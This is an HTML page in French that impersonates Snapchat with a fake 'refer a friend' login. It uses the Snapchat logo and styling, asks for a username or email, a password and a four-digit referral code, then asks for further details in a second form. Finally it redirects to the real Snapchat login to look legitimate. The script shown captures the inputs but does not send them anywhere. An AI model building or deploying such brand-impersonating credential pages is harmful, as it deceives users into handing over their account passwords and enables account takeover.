
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Snapchat | Parrainez Un Ami</title>

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .form-box {
      width: 100%;
      max-width: 400px;
      padding: 40px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      border-radius: 10px;
      text-align: center;
      background-color: #fff;
      color: #000;
    }
    .logo {
      width: 80px;
      margin: 0 auto 20px auto;
      display: block;
    }
    .form-group {
      text-align: left;
      margin-bottom: 15px;
    }
    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: bold;
      margin-bottom: 5px;
    }
    .form-group input, 
    .form-group textarea {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .form-group textarea {
      resize: vertical;
      min-height: 100px;
    }
    button.primary-btn {
      background-color: #fffc00;
      border: none;
      color: #000;
      font-weight: bold;
      padding: 12px;
      width: 100%;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
      font-size: 16px;
    }
    .links-container {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 14px;
    }
    .link-button {
      background: transparent;
      border: none;
      color: blue;
      font-weight: bold;
      cursor: pointer;
      text-decoration: underline;
    }
    .error-text {
      color: red;
      display: none;
      margin-top: 10px;
      font-size: 14px;
    }
    
    / On masque la deuxième étape par défaut /
    #stepTwoBox {
      display: none;
    }
  </style>
</head>
<body>

  <!-- Étape 1 : Connexion -->
  <div class="form-box" id="loginBox">
    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
    <h2>Snapchat | Parrainez Un Ami</h2>
    <form id="loginForm">
      <div class="form-group">
        <label for="username">Nom d'utilisateur ou e-mail</label>
        <input type="text" id="username" required />
      </div>
      <div class="form-group">
        <label for="password">Mot de passe</label>
        <input type="password" id="password" required />
      </div>
      <div class="form-group">
        <label for="referralCode">Code de parrainage</label>
        <input type="text" id="referralCode" required />
      </div>

      <button type="submit" class="primary-btn">Connexion</button>

      <div class="links-container">
        <button type="button" class="link-button">S'inscrire</button>
        <button type="button" class="link-button">Mot de passe oublié</button>
      </div>
    </form>
    <p id="errorMessage" class="error-text">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
    <p id="referralError" class="error-text">Le code de parrainage doit contenir exactement 4 chiffres.</p>
  </div>

  <!-- Étape 2 : Informations complémentaires -->
  <div class="form-box" id="stepTwoBox">
    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
    <h2>Confirmation requise</h2>
    <p>Veuillez nous en dire plus sur ce parrainage :</p>
    
    <form id="detailsForm">
      <div class="form-group">
        <textarea id="additionalInfo" placeholder="Écrivez vos détails ici..."></textarea>
      </div>
      <p id="textareaError" class="error-text" style="text-align: left;">Ce champ ne peut pas être vide.</p>
      
      <button type="submit" class="primary-btn">Confirmer</button>
    </form>
  </div>

  <script>
    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";

    // Gestion de la première étape
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const referralCode = document.getElementById('referralCode').value.trim();

      const errorMessage = document.getElementById('errorMessage');
      const referralError = document.getElementById('referralError');

      errorMessage.style.display = 'none';
      referralError.style.display = 'none';

      // Validations basiques
      if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
        errorMessage.style.display = 'block';
        return;
      }

      if (!/^\d{4}$/.test(referralCode)) {
        referralError.style.display = 'block';
        return;
      }

      // Transition vers la deuxième étape
      document.getElementById('loginBox').style.display = 'none';
      document.getElementById('stepTwoBox').style.display = 'block';
    });

    // Gestion de la deuxième étape
    document.getElementById('detailsForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const textArea = document.getElementById('additionalInfo').value.trim();
      const textAreaError = document.getElementById('textareaError');

      textAreaError.style.display = 'none';

      // Validation de la zone de texte
      if (textArea === "") {
        textAreaError.style.display = 'block';
        return;
      }

      // Action après validation réussie
      alert("Informations confirmées ! Redirection en cours...");
      window.location.href = redirectURL;
    });
  </script>
</body>
</html>
